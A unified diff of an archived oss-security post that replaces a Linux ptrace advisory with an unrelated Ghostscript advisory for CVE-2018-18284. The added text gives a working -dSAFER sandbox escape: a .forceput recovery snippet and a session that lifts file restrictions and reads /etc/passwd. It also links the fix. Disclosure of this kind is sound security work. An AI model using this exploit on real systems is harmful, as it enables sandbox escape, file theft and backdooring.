@@ -1,37 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/05/01/3
-Message-ID: <CALCETrULDOyC7po=DcKzPRrYTmSY0ye0xtmtZ2xRD6Xxh9K24Q@mail.gmail.com>
-Date: Tue, 01 May 2018 15:35:06 +0000
-From: Andy Lutomirski <luto@...nel.org>
-To: oss security list <oss-security@...ts.openwall.com>
-Subject: CVE-2018-1000199: ptrace() incorrect error handling leads to corruption and DoS
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/16/2
+Message-ID: <CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>
+Date: Tue, 16 Oct 2018 11:06:14 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284
 Content-Type: text/plain; charset=utf-8
 
-The Linux ptrace code virtualizes access to the debug registers, and
-the virtualization code has incorrect error handling.  This means that
-if you write an illegal value to, say, DR0, the internal state of the
-kernel's breakpoint tracking can become corrupt despite the fact that
-the ptrace() call will return -EINVAL.
+Hello, this <https://bugs.chromium.org/p/project-zero/issues/detail?id=1696>
+is CVE-2018-18284, another ghostscript sandbox escape. Because procedures
+in postscript are just executable arrays, all system procedures need to be
+marked as executeonly, so that users cannot peek at their internals with
+array operators.
 
-As a example, you can find the address of do_debug in /proc/kallsyms
-on an x86 kernel and pass that address to the attached PoC.  I suspect
-that architectures other than x86 are affected as well, but I haven't
-tried to exploit it.  The bug itself is spread all over the place in
-the kernel in generic and arch code.
+We have also recently learned that they must be marked as pseudo-operators,
+otherwise their contents might leak to error handlers.
 
-I haven't spotted an obvious way to get privilege escalation using
-this bug, but it may exist.  For example, it's plausible that using
-this bug to target the perf NMI handler could result in overflowing
-the NMI stack, resulting in various forms of corruption.  I haven't
-tried to analyze the impact on non-x86 architectures since I only know
-how x86 breakpoints work, but the effects of the bug could be very
-different.
+That makes sense, unless the procedure itself is dangerous - in that case
+it must be hidden.
 
-Linus has mostly fixed this upstream in commit
-f67b15037a7a50c57f72e69a6d59941ad90a0f0f.  With that commit applied,
-the error handling is still wrong but the defect results in a disabled
-breakpoint instead of an incorrect breakpoint.
+1Policy is a procedure that was correctly marked as executeonly and made a
+pseudo-operator, but was basically just a wrapper around .forceput. Here is
+how to exploit it:
 
-This bug was discovered by me.
+/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1 get
+exec pop pop pop pop pop pop pop } def
 
-View attachment "dr7_clash.c" of type "text/x-csrc" (1672 bytes)
+Once you have access to .forceput, you can basically do whatever you want,
+see the exploit for CVE-2018-17961 a full example of backdooring .bashrc.
+
+Here is a simpler repro, just reading /etc/passwd:
+
+$ gs -dSAFER -sDEVICE=ppmraw
+GPL Ghostscript 9.25 (2018-09-13)
+Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
+GS>/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
+get exec pop pop pop pop pop pop pop } def
+GS>systemdict /SAFER false .forceput
+GS>systemdict /userparams get /PermitFileControl [(*)] .forceput
+GS>systemdict /userparams get /PermitFileWriting [(*)] .forceput
+GS>systemdict /userparams get /PermitFileReading [(*)] .forceput
+GS>(/etc/passwd) (r) file 1024 string readline pop ==
+(root:x:0:0:root:/root:/bin/bash)
+GS>
+
+This patch solves it:
+
+http://git.ghostscript.com/?p=ghostpdl.git;h=8d19fdf63f91f50466b08f23e2d93d37a4c5ea0b
+
+Side note: I'm done looking at ghostscript for now, but still *strongly*
+recommend that we deprecate untrusted postscript and disable ghostscript
+coders by default in policy.xml.
+
+Thanks, Tavis.
+
